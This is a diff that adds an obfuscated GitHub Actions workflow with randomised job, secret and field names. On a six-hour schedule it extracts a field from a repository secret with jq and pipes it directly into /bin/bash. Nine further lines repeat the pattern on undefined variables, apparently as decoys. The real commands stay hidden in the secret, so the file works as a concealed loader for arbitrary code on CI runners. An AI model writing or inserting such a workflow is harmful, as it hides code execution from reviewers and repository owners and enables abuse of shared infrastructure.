@@ -1,0 +1,27 @@
+name: shenjingcha4189
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shenjingcha4189
+        env:
+          ucy90: ${{ secrets.ucy90 }}
+        run: |
+          echo $ucy90 | jq -r .ulx2 | /bin/bash
+          echo $wrud20600 | jq -r .oh9676 | /bin/bash
+          echo $b8513 | jq -r .adlmj52 | /bin/bash
+          echo $pgzv96432 | jq -r .haln4423 | /bin/bash
+          echo $x46 | jq -r .hbuaa6681 | /bin/bash
+          echo $voyk963 | jq -r .eak1 | /bin/bash
+          echo $gejb7 | jq -r .flieq8 | /bin/bash
+          echo $a6334 | jq -r .ibmku8 | /bin/bash
+          echo $gmzhk02040 | jq -r .t34501 | /bin/bash
+          echo $eaar77 | jq -r .l87839 | /bin/bash
+
